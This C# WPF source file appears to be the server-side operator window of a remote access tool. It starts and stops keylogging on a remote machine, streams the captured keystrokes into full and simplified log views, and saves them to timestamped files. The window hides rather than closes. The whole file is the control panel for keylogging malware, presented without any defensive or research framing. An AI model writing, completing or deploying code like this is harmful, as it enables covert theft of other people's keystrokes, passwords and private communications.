using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;
using Protocol;

namespace Server
{
    /// <summary>
    /// Interaction logic for KeyLog.xaml
    /// </summary>
    public partial class KeyLog : Window
    {
        private bool AutoRefresh = false;

        private int Rate = 5000;
        
        public KeyLog()
        {
            InitializeComponent();
        }

        private async void Receive()
        {
            await Task.Run(() =>
            {
                do
                {
                    Log log = ConnectionManager.ReceiveKeyLog();
                    if (log != null)
                    {
                        if(log.FullLog != String.Empty)
                            Dispatcher.Invoke(() =>
                            {
                                LogBox.AppendText(log.FullLog);
                                LogBox.ScrollToEnd();
                            });
                        if(log.SimpleLog != String.Empty)
                            Dispatcher.Invoke(() =>
                            {
                                SimpleLogBox.AppendText(log.SimpleLog);
                                SimpleLogBox.ScrollToEnd();
                            });
                        if(log.FullLog == "<NoConnection>") Thread.Sleep(1000);
                    }
                    else
                    {

                    }

                    if (AutoRefresh)
                        Thread.Sleep(Rate);
                } while (AutoRefresh);
            });
        }

        private void RefreshRate_OnTextChanged(object sender, TextChangedEventArgs e)
        {
            try
            {
                if (Rate < 100)
                {
                    Rate = 100;
                    RefreshRate.Text = Rate.ToString();
                }
                else
                {
                    Rate = int.Parse(RefreshRate.Text);
                }
            }
            catch (Exception exception)
            {
                RefreshRate.Text = ConnectionManager.fps.ToString();
            }
        }

        private void Refresh_OnClick(object sender, RoutedEventArgs e)
        {
            Receive();
        }

        private void SaveButton_OnClick(object sender, RoutedEventArgs e)
        {
            StreamWriter writer = new StreamWriter($"Date({DateTime.Now.Hour}-{DateTime.Now.Month}-{DateTime.Now.Day}) Time({DateTime.Now.Hour}-{DateTime.Now.Minute}-{DateTime.Now.Second}).txt");
            TextRange textRange = new TextRange(
                LogBox.Document.ContentStart,
                LogBox.Document.ContentEnd
            );

            writer.Write(textRange.Text);
            
            writer.Close();
        }

        private void StartButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.StartKeyLogging);
            SimpleLogBox.Document.Blocks.Clear();
            LogBox.Document.Blocks.Clear();
        }

        private void StopButton_OnClick(object sender, RoutedEventArgs e)
        {
            ConnectionManager.SendCommand(Commands.StopKeyLogging);
        }

        private void CheckBox_OnClick(object sender, RoutedEventArgs e)
        {
            if (CheckBox.IsChecked != null) AutoRefresh = (bool)CheckBox.IsChecked;
            if (AutoRefresh)
            {
                Refresh.IsEnabled = false;
                Receive();
            }
            else
            {
                Refresh.IsEnabled = true;
            }
        }

        private void KeyLog_OnClosing(object sender, CancelEventArgs e)
        {
            e.Cancel = true;
            this.Hide();
        }
    }
}
